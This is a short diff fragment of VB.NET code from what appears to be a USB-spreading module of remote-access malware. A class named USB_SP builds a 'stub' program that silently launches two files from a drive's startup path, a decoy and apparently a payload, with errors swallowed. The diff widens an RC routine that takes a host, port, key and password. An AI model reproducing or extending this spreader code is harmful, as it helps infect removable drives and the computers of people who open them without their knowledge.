@@ -18,7 +18,7 @@ Public Class USB_SP
     Public Shared MyPath As String = GetFileName(Application.ExecutablePath)
     Public Shared Stub As String = "Imports System.Windows.Forms.Application, System.Diagnostics.Process, System.Reflection" & vbNewLine & "<Assembly: AssemblyCopyright(" & """%C%""" & ")> " & vbNewLine & "Module Nervousness" & vbNewLine & "    Sub Main()" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%A%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "        Try" & vbNewLine & "            Start(StartupPath & " & """\%B%""" & ")" & vbNewLine & "        Catch : End Try" & vbNewLine & "    End Sub" & vbNewLine & "End Module"
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal PW As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
 
         Try
             If GTV("USB") = Nothing Or GTV("USB") = "Not ready" Then
